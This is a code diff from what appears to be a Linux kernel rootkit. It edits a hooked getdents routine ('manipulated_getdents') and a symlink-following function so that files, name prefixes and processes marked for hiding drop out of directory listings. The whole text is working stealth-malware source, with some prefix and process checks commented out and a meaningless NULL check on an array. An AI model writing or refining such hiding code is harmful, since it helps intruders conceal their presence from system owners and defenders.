@@ -139,7 +139,7 @@ check_hide_process(int fd, char *d_name)
 }
 
 int
-check_hide_symlink(char *path)
+check_hide_loop(char *path)
 {
 	mm_segment_t old_fs;
 	char lpath[1024], curpath[1024];
@@ -148,6 +148,23 @@ check_hide_symlink(char *path)
 	strncpy(curpath, path, 1024);
 		
 	do {
+		
+		/* safety check */	
+		if(curpath == NULL) {
+			break;
+		}
+		
+		/* check if the current link is pointing to a hidden path */
+		if(check_hide_fpath(curpath)) {
+			return 1;
+		}
+
+		/* check if the current link is pointing to a file with a hiding prefix */
+		if(check_hide_fprefix(curpath)) {
+			return 1;
+		}
+
+		/* reset variables */
 		memset(lpath, 0, 1024);	
 	
 		/* tell the kernel to ignore kernel-space memory in syscalls */
@@ -162,26 +179,9 @@ check_hide_symlink(char *path)
 			
 		/* reset the kernel */
 		set_fs(old_fs);
-
-		/* needed because the other functions apparently can't handle it */		
-		if(lpath_len < 0) {
-			break;
-		}
 		
-		/* check if the current link is pointing to a hidden path */
-		if(check_hide_fpath(lpath)) {
-			return 1;
-		}
-
-		/* check if the current link is pointing to a file with a hiding prefix */
-		if(check_hide_fprefix(lpath)) {
-			return 1;
-		}
-
-		/* prepare everything for the next loop */
-		memset(curpath, 0, 1024);
+		/* prepare for the next loop */
 		strncpy(curpath, lpath, 1024);
-
 	} while (lpath_len > 0);
 	
 	return 0;
@@ -217,9 +217,9 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 		memset(path+path_len + strlen(dirp->d_name) + 1, '\0', 1);
 
 		if(check_hide_fpath(path)
-				|| check_hide_fprefix(path)
-				|| check_hide_process(fd, dirp->d_name)
-				|| check_hide_symlink(path)) {	
+				//|| check_hide_fprefix(path)
+				//|| check_hide_process(fd, dirp->d_name)
+				|| check_hide_loop(path)) {	
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
 		} else if(tlen != 0) {
